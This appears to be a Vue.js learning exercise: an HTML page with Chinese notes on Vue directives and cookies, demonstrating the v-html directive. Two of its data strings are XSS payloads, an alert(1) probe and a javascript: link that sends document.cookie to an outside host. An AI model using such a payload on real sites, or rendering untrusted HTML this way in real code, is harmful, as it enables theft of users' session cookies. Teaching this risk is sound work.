<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>First_Meet_Vue</title>
    <!-- introduce vue.js -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<!-- 学过的指令：
v-bind : 单向绑定解析表达式， 可简写为 :xxx
v-model : 双向数据绑定
v-for : 遍历数组、对象、字符串
v-on : 绑定事件监听， 可简写为 @
v-if : 条件渲染（动态控制节点是否存在）
v-else : 条件渲染（动态控制节点是否存在）
v-show : 条件渲染（动态控制节点是否展示） 
v-text指令 : 
    1. 作用： 向其所在的节点中渲染文本内容。
    2. 与插值语法的区别： v-text会替换掉节点中的内容-->


<!-- 
    可以通过网页检查>Application 写入cookie，是浏览器存在硬盘里的空间里，丢不了。
在console里写 document.cookie 就拿到了写入的cookie 
但是现在网站有HttpOnly， 只有Http协议才可读取和携带， JS也不可以读取
-->

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
         <div>{{name}}</div>
         <div v-html="str"></div>
         <div v-html="str2"></div>
         <div v-html="str3"></div>
    </div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止生产提示

    const vm = new Vue({
        data(){
            return{
                name:'aa',
                str:"<h3>Hello, World!</h3>",
                str2:"<a href=javascript:alert(1)>Click Me to get resources <a>",
                str3:"<a href=javascript:location.href='http://www.baidu.com?'+document.cookie>Click Me to get resources, I'll steal our cookie <a>",
            }
        }
    })
    vm.$mount('#root')
</script>

</html>
